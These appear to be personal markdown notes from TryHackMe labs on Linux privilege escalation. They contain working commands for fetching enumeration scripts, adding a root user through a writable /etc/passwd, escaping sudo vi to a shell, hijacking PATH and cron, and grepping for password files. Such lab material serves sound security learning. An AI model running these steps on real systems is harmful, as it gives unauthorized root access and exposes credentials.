# Linux Privilige Escalation

Important Tools
```
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; chmod +x ./lse.sh
# ./lse.sh : to look at overview
# ./lse.sh -l 1 -i : to verbose
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh; chmod +x ./LinEnum.sh
# mkdir report
# ./LinEnum.sh -k password -e report -t

# important site
https://gtfobins.github.io/
```

## Common Linux PrivEsc
> https://tryhackme.com/room/commonlinuxprivesc

What does "privilege escalation" mean?  

At it's core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

![privesc](./media/16-common-privesc.png)

There are two main privilege escalation variants:

- Horizontal privilege escalation: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you
- Vertical privilege escalation (privilege elevation): This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised

### Enumeration 
LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
```bash 
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Abusing SUID/GUID Files

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: `find / -perm -u=s -type f 2>/dev/null` to search the file system for SUID/GUID files. Let's break down this command.

```bash
$ find / -perm -u=s -type f 2>/dev/null

find - Initiates the "find" command
/ - Searches the whole file system
-perm - searches for files with specific permissions
-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
-type f - Only search for files
2>/dev/null - Suppresses errors

```

### Exploiting Writable /etc/passwd

Understanding /etc/passwd

The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.

The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

    test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]

- Username: It is used when user logs in. It should be between 1 and 32 characters in length.
- Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
- User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
- Group ID (GID): The primary group ID (stored in /etc/group file)
- User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
- Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
- Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

**How to exploit a writable /etc/passwd**

It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

`openssl passwd -1 -salt [salt] [password]`
`openssl passwd -1 -salt hacker tryhackme_password`

```
user7@polobox:/home/user3$ openssl passwd -1 -salt hacker tryhackme_password
$1$hacker$USbXjKgMZxKTGtRhS57M31
user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

to create new user
```
# template
username:passwordhash:0:0:root:/root:/bin/bash
# our test 
thm:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash

# su thm :with the password use added
```

### Escaping Vi Editor

use `sudo -l`
```
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
(root) NOPASSWD: /usr/bin/vi
```

search in : https://gtfobins.github.io/

to elevate
```
sudo vi
# once inside type
:!sh
# this will pop you a shell

# id 
uid=0(root)
```

### Exploiting Crontab

What is Cron?

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

How to view what Cronjobs are active.

We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.

Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

```
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as
command = What command should be run
For Example,
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

exploit if the executor of the cronjob is the root level, we can hijack the script that is pointed and put a reverse listener

### Exploiting PATH Variable
What is PATH?

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

How does this let us escalate privileges?

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!


Let's do it!

in this exercise a $HOME/`script` file is executing the `ls` command with the root privilege, 
let's try to over write the PATH file to overide command

```
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
$HOME/script

$ id 
uid=0(root)
```

### FURTHER LEARNING

Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.

- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation


**PayloadAllTheThings**
Files containing passwords
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

**sushant747**

World writable scripts invoked as root .
If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.

```
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

## Linux PrivEsc
> https://tryhackme.com/room/linuxprivesc

wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; chmod +x ./lse.sh
